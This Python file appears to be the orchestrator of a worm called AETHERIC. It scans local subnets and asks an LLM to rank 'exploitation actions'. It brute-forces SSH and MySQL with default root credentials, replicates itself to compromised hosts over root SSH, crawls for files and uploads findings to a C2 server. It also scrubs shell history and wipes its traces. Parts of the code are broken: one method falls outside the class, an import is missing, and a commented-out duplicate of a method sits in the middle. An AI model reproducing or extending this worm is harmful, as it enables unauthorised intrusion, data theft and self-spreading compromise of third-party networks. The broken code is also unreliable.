"""
State machine orchestrator: controls phases and main loop.
"""
import time
import asyncio
import json
import os
import sys
from typing import Dict, Any, List
from modules.network_recon import NetworkRecon
from modules.file_crawler import FileCrawler
from modules.privesc_engine import PrivescEngine
from modules.attack_planner import AttackPlanner
from modules.worm_replicator import WormReplicator
from modules.process_scraper import ProcessScraper
from core.llm_brain import LLMBrain
from core.c2_sync import C2Sync
from core.anti_forensics import AntiForensics
from utils.logging_utils import get_logger

logger = get_logger(__name__)

class Orchestrator:
    PHASES = ['SURVEY', 'ENUMERATE', 'ESCALATE', 'EXFILTRATE', 'PROPAGATE', 'HIBERNATE']
    
    def __init__(self, child_mode=False, parent_ip=None):
        self.child_mode = child_mode
        self.parent_ip = parent_ip
        self.phase = 0
        self.state = {}
        self.targets = []          # List of discovered IPs
        self.compromised = set()   # IPs already owned
        self.findings = []         # Local findings
        self.llm = LLMBrain()
        self.c2 = C2Sync()
        self.af = AntiForensics()
        self.net = NetworkRecon()
        self.fc = FileCrawler()
        self.pe = PrivescEngine()
        self.ap = AttackPlanner()
        self.wr = WormReplicator()
        self.ps = ProcessScraper()
        self.running = True

    def run(self):
        """Main loop with error handling and resilience."""
        logger.info("AETHERIC orchestrator started. Child mode: %s", self.child_mode)
        # Scrub history immediately
        self.af.scrub_history()

        while self.running:
            try:
                self._execute_phase()
                time.sleep(5)  # small inter-phase pause
            except Exception as e:
                logger.exception("Phase execution error: %s", str(e))
                # Write error to temp file for later shredding (handled by anti_forensics)
                with open('/tmp/.aetheric_err', 'a') as f:
                    f.write(f"{time.time()}: {str(e)}\n")
                time.sleep(60)  # back off

            # Check killswitch
            if os.path.exists('/tmp/.aetheric_kill'):
                self.af.full_wipe()
                break

    def _execute_phase(self):
        phase_name = self.PHASES[self.phase % len(self.PHASES)]
        logger.info("Entering phase: %s", phase_name)

        if phase_name == 'SURVEY':
            self._phase_survey()
        elif phase_name == 'ENUMERATE':
            self._phase_enumerate()
        elif phase_name == 'ESCALATE':
            self._phase_escalate()
        elif phase_name == 'EXFILTRATE':
            self._phase_exfiltrate()
        elif phase_name == 'PROPAGATE':
            self._phase_propagate()
        elif phase_name == 'HIBERNATE':
            self._phase_hibernate()

        self.phase += 1

    def _phase_survey(self):
        """Discover local subnet and scan targets."""
        # Get local subnet
        subnet = self.net.get_local_subnet()
        logger.info("Scanning subnet: %s", subnet)
        # Ping sweep
        hosts = self.net.ping_sweep(subnet)
        logger.info("Discovered %d hosts", len(hosts))
        # For each host, run nmap lightweight
        for host in hosts:
            if host in self.compromised:
                continue
            # Determine if we should scan more
            # Use nmap to detect open ports
            ports = self.net.quick_scan(host)
            if ports:
                self.targets.append({'ip': host, 'ports': ports})
        # Store targets in c2
        for t in self.targets:
            self.c2.upload_target(t)

    def _phase_enumerate(self):
        """Deep enumeration on targets (via AI)."""
        for target in self.targets[:]:
            if target['ip'] in self.compromised:
                continue
            # Gather nmap XML or service info
            svc = self.net.service_scan(target['ip'], target['ports'])
            # Send to LLM for prioritization
            prompt = self._build_llm_prompt(target['ip'], svc)
            response = self.llm.query(prompt)
            actions = self.llm.parse_actions(response)
            if actions:
                target['actions'] = actions
            else:
                # fallback: default rules
                actions = self._fallback_actions(target['ip'], svc)
                target['actions'] = actions

    def _build_llm_prompt(self, ip, services):
        return f"IP {ip} has services: {json.dumps(services)}. Provide top 5 exploitation actions as JSON."

    def _fallback_actions(self, ip, services):
        # Simple rule-based
        actions = []
        for svc in services:
            if svc['port'] == 22:
                actions.append({'type': 'brute', 'target': ip, 'port': 22, 'user': 'root', 'pass': 'root'})
            if svc['port'] == 3306:
                actions.append({'type': 'try_default_creds', 'target': ip, 'port': 3306, 'user': 'root', 'pass': ''})
        return actions

    def _phase_escalate(self):
        """Execute attack plans."""
        for target in self.targets:
            if target['ip'] in self.compromised:
                continue
            for action in target.get('actions', []):
                if action['type'] == 'brute':
                    success = self.ap.brute_ssh(action['target'], action['user'], action['pass'])
                elif action['type'] == 'try_default_creds':
                    success = self.ap.try_default_creds(action['target'], action['port'])
                elif action['type'] == 'cve':
                    success = self.ap.run_cve(action['target'], action['cve_id'])
                else:
                    continue
                if success:
                    self.compromised.add(target['ip'])
                    # Replicate
                    self.wr.replicate(target['ip'], self.parent_ip or '0.0.0.0')
                    # Mark in c2
                    self.c2.mark_compromised(target['ip'])
                    # After compromise, we can also do deep digs on that host
                    # But we'll do that in exfiltrate
                    break
    def _phase_exfiltrate(self):
        """Run deep crawler on compromised hosts (local AND remote)."""
        # Local crawl
        findings = self.fc.crawl()
        for finding in findings:
            self.c2.upload_finding(finding)
        
        # Remote deep crawl on compromised hosts
        for ip in self.compromised:
            if ip != self._get_local_ip():  # don't re-scan self
                self._remote_deep_scan(ip)

def _remote_deep_scan(self, ip):
    """Run deep file crawler and process scraper on remote host."""
    # SSH into compromised host and run the crawler
    cmd = f"ssh -o StrictHostKeyChecking=no root@{ip} 'python3 /tmp/aetheric_install/main.py --child --parent-ip {self.parent_ip}'"
    subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    # def _phase_exfiltrate(self):
    #     """Run file crawler and process scraper on compromised hosts (local)."""
    #     # On the current host, run deep crawl
    #     findings = self.fc.crawl()
    #     for finding in findings:
    #         self.c2.upload_finding(finding)
    #     # Process scraper
    #     secrets = self.ps.scrape()
    #     for secret in secrets:
    #         self.c2.upload_finding(secret)
    #     # Also, for each compromised host we might remote crawl (but that's future)

    def _phase_propagate(self):
        """Propagate to new targets discovered from findings."""
        # Fetch additional targets from c2 (maybe from other agents)
        new_targets = self.c2.get_pending_targets()
        for nt in new_targets:
            if nt not in self.compromised and nt not in [t['ip'] for t in self.targets]:
                self.targets.append({'ip': nt, 'ports': []})  # will be scanned later

    def _phase_hibernate(self):
        """Sleep for a while, then wake."""
        logger.info("Hibernating for 900 seconds")
        time.sleep(900)
